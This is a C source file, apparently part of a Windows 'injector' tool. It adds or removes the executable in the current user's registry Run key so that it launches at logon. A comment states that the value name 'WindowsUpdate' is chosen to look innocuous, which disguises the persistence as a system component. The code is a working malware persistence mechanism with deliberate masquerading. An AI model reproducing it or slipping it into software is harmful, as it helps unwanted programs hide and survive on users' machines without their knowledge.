#include <Windows.h>
#include <stdio.h>
#include "../Common/constants.h"

// Add injector to Windows startup (Registry Run key)
// Returns true on success, false on failure
bool AddToStartup() {
    printf("\n[*] Adding to startup registry...\n");

    HKEY hKey;
    LONG result;

    // Open or create the Run key
    result = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        REGISTRY_KEY,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    );

    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key. Error: %ld\n", result);
        return false;
    }

    // Get full path to current executable
    char exePath[MAX_PATH];
    DWORD pathLen = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (pathLen == 0) {
        printf("[-] Failed to get executable path. Error: %lu\n", GetLastError());
        RegCloseKey(hKey);
        return false;
    }

    printf("[*] Executable path: %s\n", exePath);

    // Set registry value
    result = RegSetValueExA(
        hKey,
        REGISTRY_VALUE_NAME,  // "WindowsUpdate" - innocuous name
        0,
        REG_SZ,
        (BYTE*)exePath,
        pathLen + 1
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set registry value. Error: %ld\n", result);
        return false;
    }

    printf("[+] Successfully added to startup!\n");
    printf("[+] Registry Key: HKCU\\%s\n", REGISTRY_KEY);
    printf("[+] Value Name: %s\n\n", REGISTRY_VALUE_NAME);

    return true;
}

// Remove injector from Windows startup
// Returns true on success, false on failure
bool RemoveFromStartup() {
    printf("\n[*] Removing from startup registry...\n");

    HKEY hKey;
    LONG result;

    // Open the Run key
    result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        REGISTRY_KEY,
        0,
        KEY_WRITE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key. Error: %ld\n", result);
        return false;
    }

    // Delete the value
    result = RegDeleteValueA(hKey, REGISTRY_VALUE_NAME);
    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to delete registry value. Error: %ld\n", result);
        return false;
    }

    printf("[+] Successfully removed from startup!\n\n");
    return true;
}
